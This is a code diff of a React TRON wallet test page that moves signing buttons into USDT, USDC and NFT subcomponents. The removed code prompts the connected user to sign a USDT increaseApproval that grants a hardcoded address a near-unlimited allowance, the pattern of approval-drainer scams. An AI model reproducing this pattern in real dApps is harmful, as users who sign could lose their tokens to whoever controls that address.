@@ -3,7 +3,10 @@ import {
   Card, Col, Row, Space, message,
 } from 'antd';
 import { useState } from 'react';
-import { myTronAddress, tronUSDTAddress } from '../../../../utils/const';
+import { myTronAddress } from '../../../../utils/const';
+import USDT from './components/USDT';
+import USDC from './components/USDC';
+import NFT from './components/NFT';
 
 export default function SignTransaction({ account }) {
   const handleSign = async () => {
@@ -110,28 +113,6 @@ export default function SignTransaction({ account }) {
     }
   };
 
-  const [increaseApprovalLoading, setIncreaseApprovalLoading] = useState(false);
-  const increaseApproval = async () => {
-    try {
-      setIncreaseApprovalLoading(true);
-      const parameter = [{ type: 'address', value: myTronAddress }, { type: 'uint256', value: tronWeb.toSun(99999999999999) }];
-      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
-        tronWeb.address.toHex(tronUSDTAddress),
-        'increaseApproval(address,uint256)',
-        { feeLimit: 100000000 },
-        parameter,
-        tronWeb.address.toHex(account),
-      );
-      const signedTx = await tronWeb.trx.sign(transaction);
-      await tronWeb.trx.sendRawTransaction(signedTx);
-    } catch (error) {
-      console.error(error);
-      message.error('操作失败');
-    } finally {
-      setIncreaseApprovalLoading(false);
-    }
-  };
-
   const [sendTrxLoading, setSendTrxLoading] = useState(false);
   const sendTrx = async () => {
     try {
@@ -151,7 +132,10 @@ export default function SignTransaction({ account }) {
     <Card title="合约交互 - 请打开控制台查看签名结果">
       <Space direction="vertical" style={{ width: '100%' }}>
         <Row gutter={6}>
-          <Col span={6}>
+          <USDT account={account} />
+          <USDC account={account} />
+          <NFT account={account} />
+          {/* <Col span={6}>
             <Card direction="vertical" title="">
               <Space direction="vertical" style={{ width: '100%' }}>
                 <Button
@@ -173,17 +157,9 @@ export default function SignTransaction({ account }) {
               </Space>
             </Card>
           </Col>
-          <Col span={12}>
+          <Col span={6}>
             <Card direction="vertical">
               <Space direction="vertical" style={{ width: '100%' }}>
-                <Button
-                  block
-                  disabled={!account}
-                  loading={increaseApprovalLoading}
-                  onClick={increaseApproval}
-                >
-                  increaseApproval
-                </Button>
                 <Button
                   block
                   disabled={!account}
@@ -196,7 +172,7 @@ export default function SignTransaction({ account }) {
                 </Button>
               </Space>
             </Card>
-          </Col>
+          </Col> */}
         </Row>
       </Space>
     </Card>
